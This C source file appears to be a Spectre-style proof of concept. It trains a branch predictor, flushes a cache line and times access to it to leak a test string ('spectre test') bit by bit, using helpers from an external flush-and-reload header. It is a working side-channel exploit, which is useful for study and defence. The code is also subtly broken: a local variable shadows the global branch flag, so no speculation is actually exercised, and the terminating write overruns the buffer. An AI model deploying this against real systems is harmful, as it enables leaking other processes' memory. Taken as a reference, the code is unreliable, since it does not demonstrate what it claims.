

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include "../fr.h"
char buf[4096];
bool take = true;



char* secret = "spectre test";
void branch(char* a, int j)
{
    if (take)
    {
        if (*a & (1 << j))
        {
            buf[0] = 1;
        }
    }
    
}



void train()
{
    char a = 1;
    bool take = true;
    for (int i = 0; i < 100000; i++)
    {
        flush(&take);
        branch(&a, 0);
        flush(&take);
    }
    take = false;
    flush(&take);
}

#define THRESHOLD 100

int main(int argc, char** argv)
{
    
    


    char found_secret[strlen(secret)];
    found_secret[strlen(secret)] = 0;
    memset(found_secret, 0x0, strlen(secret));


    for (int i = 0; i < strlen(secret); i++)
    {
        char c = 0x0;
        for (int j = 0; j < 8; j++)
        {
            train();
            flush(&buf[0]);
            branch(secret + i, j);
            unsigned long timing;
            if ((timing = probe_timing(&buf[0])) < THRESHOLD)
            {
                c |= (1<<j);
                printf("Got Hit: %ld\n", timing);
            }
            else
                printf("Miss: %ld\n", timing);
        }
        found_secret[i] = c;
    }
    printf("Found Secret: %s\n", found_secret);

    return 0;
}